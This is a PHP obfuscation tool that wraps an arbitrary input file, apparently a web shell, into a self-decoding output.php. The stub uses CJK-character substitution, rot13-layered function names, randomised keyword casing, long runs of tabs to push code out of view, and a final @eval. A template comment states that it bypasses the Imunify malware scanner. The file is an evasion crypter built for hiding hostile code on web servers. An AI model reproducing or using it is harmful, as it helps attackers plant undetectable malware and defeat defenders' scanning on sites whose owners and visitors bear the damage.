<?php
$funcsP = [];
$keysArr = [];
$keysVal = [];

$template = '<?php
/* Imunify Bypassed By ./SansXpl */ many_space $_____________="roots_13"[4]."roots_13"[3]."roots_13"[0]."roots_13"[5]."roots_13"[0]."roots_13"[2]."roots_13"[3]."roots_13"[6]."roots_13"[7]; many_space $______________="withlocaluser"[10]."withlocaluser"[2]."withlocaluser"[12]."withlocaluser"[2]."withlocaluser"[5]."withlocaluser"[8]."withlocaluser"[5]."withlocaluser"[0]."withlocaluser"[11]."withlocaluser"[12]; many_space $_______________=function_keys$________________=preg_replacefunction_vals many_space function ____________________($_______){global mb_convert_encoding,base64_decode,pack,$________________;return $________________(\'/\\\\\\\\u([0-9a-fA-F]{4})/\', fn($__) => mb_convert_encoding(pack("H*", $__[1]), base64_decode("VVRGLTg="), base64_decode("VVRGLTE2QkU=")), $_______);} many_space (function($__________){global array_combine,base64_decode,mb_strlen,mb_substr;$___=array_combine([keys_arr],[keys_val]);$____="";for($i=0;$i<mb_strlen($__________,base64_decode("VVRGLTg="));$i+=2){$______________________=mb_substr($__________,$i,2,base64_decode("VVRGLTg="));$____.=isset($___[$______________________])?$___[$______________________]:"";}@eval($____);}) many_space many_space many_space

("encrypted_code");
';

function generateKeys($keyFile)
{
    $keys = array();
    $characters = str_split(" \t\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~");  // Alphanumeric, punctuation, and whitespace
    $chineseCharacters = json_decode('["\u4e00","\u4e01","\u4e02","\u4e03","\u4e04","\u4e05","\u4e06","\u4e07","\u4e08","\u4e09"]');  // A subset of Chinese characters for example
    $kanjiCharacters = json_decode('["\u4e00","\u4e01","\u4e02","\u4e03","\u4e04","\u4e05","\u4e06","\u4e07","\u4e08","\u4e09"]');  // A subset of Kanji characters for example

    shuffle($characters);
    shuffle($chineseCharacters);
    shuffle($kanjiCharacters);

    $data = array();
    for ($i = 0; $i < count($characters); $i++) {
        $key1 = $chineseCharacters[$i % count($chineseCharacters)];
        $key2 = $kanjiCharacters[$i % count($kanjiCharacters)];
        $keys[$key1 . $key2] = $characters[$i];
        $data[] = array('_' => $characters[$i], '__' => $key1, '___' => $key2);
    }

    $file = fopen($keyFile, 'w');
    fputcsv($file, array('_', '__', '___'));
    foreach ($data as $row) {
        fputcsv($file, $row);
    }
    fclose($file);

    return $keys;
}

function encryptString($keyFile, $stringToEncrypt)
{
    global $keysArr, $keysVal;
    $keys = array();
    if (($handle = fopen($keyFile, 'r')) !== FALSE) {
        fgetcsv($handle);  // Skip header row
        while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
            $k = $data[1] . $data[2];
            $keys[$data[0]] = $data[1] . $data[2];
            $keysArr[] = '____________________("' . encode_to_unicode_escape($k) . '")';
            $keysVal[] = 'base64_decode("' . base64_encode($data[0]) . '")';
        }
        $keysArr = implode(',', $keysArr);
        $keysVal = implode(',', $keysVal);

        fclose($handle);
    }

    $encodedString = '';
    for ($i = 0; $i < strlen($stringToEncrypt); $i++) {
        $char = $stringToEncrypt[$i];
        $encodedString .= isset($keys[$char]) ? $keys[$char] : '';
    }
    return $encodedString;
}

function decryptString($keyFile, $stringToDecrypt)
{
    $keys = array();
    if (($handle = fopen($keyFile, 'r')) !== FALSE) {
        fgetcsv($handle);  // Skip header row
        while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
            $keys[$data[1] . $data[2]] = $data[0];
        }
        fclose($handle);
    }
    $decodedString = '';
    for ($i = 0; $i < mb_strlen($stringToDecrypt, 'UTF-8'); $i += 2) {
        $encryptedKey = mb_substr($stringToDecrypt, $i, 2, 'UTF-8');
        $decodedString .= isset($keys[$encryptedKey]) ? $keys[$encryptedKey] : '';
    }
    return $decodedString;
}

function encode_to_unicode_escape($str)
{
    $encoded = '';
    $length = mb_strlen($str, 'UTF-8');
    for ($i = 0; $i < $length; $i++) {
        $char = mb_substr($str, $i, 1, 'UTF-8');
        $unicode = unpack('H*', mb_convert_encoding($char, 'UTF-32BE', 'UTF-8'));
        $encoded .= '\u' . substr('0000' . $unicode[1], -4);
    }
    return $encoded;
}

function generate_unique_var_names($count)
{
    $variables = [];
    $lengths = [];

    for ($i = 0; $i < $count; $i++) {
        $length = 0;
        do {
            $length = rand(30, 50);
        } while (in_array($length, $lengths));

        $lengths[] = $length;
        $variable = '$' . str_repeat('_', $length);
        $variables[] = $variable;
    }

    return $variables;
}

function generate_func($function)
{
    global $funcsP;
    $arr = [];
    $function = explode(" ", $function);
    $index = 0;
    shuffle($function);

    foreach ($function as $func) {
        $funcsP[] = $func;
        $split = str_split($func);
        $splitArr = [];

        foreach ($split as $char) {
            $splitArr[] = "$char:" . '$______________($_______________[' . $index . '])';
            $index++;
        }

        // shuffle($splitArr);
        $arr[] = implode('|', $splitArr);
    }

    return $arr;
}

function rotManyTime($str, $count)
{
    $func1 = '';
    $func2 = '';
    for ($i = 0; $i < $count; $i++) {
        $func1 .= '$_____________(';
        $func2 .= ')';
        $str = str_rot13($str);
    }
    return $func1 . '"' . $str . '"' . "$func2;";
}

function spaceManyTime($count)
{
    $space = '';
    for ($i = 0; $i < $count; $i++) {
        $space .= "\t";
    }
    return $space;
}

$functions = "array_combine base64_decode mb_strlen mb_substr mb_convert_encoding pack";
$assoc_array = generate_func($functions);
$funcsK = '';
$funcsV = '';
$funcsN = generate_unique_var_names(count($assoc_array));

foreach ($assoc_array as $i => $kf) {
    $ex = explode("|", $kf);
    $fv = [];
    foreach ($ex as $x) {
        $xx = explode(":", $x);
        $funcsK .= $xx[0];
        $fv[] = $xx[1];
    }
    $funcsV .= $funcsN[$i] . '=' . implode('.', $fv) . ';';
    $funcsP[$i] = "{$funcsP[$i]}:{$funcsN[$i]}";
}

$funcsK = preg_replace_callback(
    '/[a-zA-Z]/',
    function ($matches) {
        return rand(0, 1) ? strtoupper($matches[0]) : strtolower($matches[0]);
    },
    $funcsK
);

$funcsK = rotManyTime($funcsK, 15);

$keyFile = 'encodedKeys.csv';
$stringToEncrypt = file_get_contents('input.txt');

$encryptedString = encryptString($keyFile, $stringToEncrypt);

$template = str_replace('function_keys', $funcsK, $template);
$template = str_replace('function_vals', $funcsV, $template);
$template = str_replace('keys_arr', $keysArr, $template);
$template = str_replace('keys_val', $keysVal, $template);
$template = str_replace('preg_replace', rotManyTime("preg_replace_callback", 15), $template);
$template = str_replace('many_space', spaceManyTime(200), $template);


$replaced = ['strrev', 'function', 'use', 'for', 'isset', 'eval'];
foreach ($replaced as $rep) {
    $template = str_replace($rep, preg_replace_callback('/[a-zA-Z]/', function ($matches) {
        return rand(0, 1) ? strtoupper($matches[0]) : strtolower($matches[0]);
    }, $rep), $template);
}
foreach ($funcsP as $funcAlias) {
    // echo "$funcAlias  ";
    $funcAlias = explode(':', $funcAlias);
    $template = str_replace($funcAlias[0], $funcAlias[1], $template);
}

$template = str_replace('encrypted_code', $encryptedString, $template);
file_put_contents('output.php', $template);
// echo 'Encrypted:';
// echo $encryptedString;

$decryptedString = decryptString($keyFile, $encryptedString);
// echo "\n\nDecrypted:\n";
// echo $decryptedString;
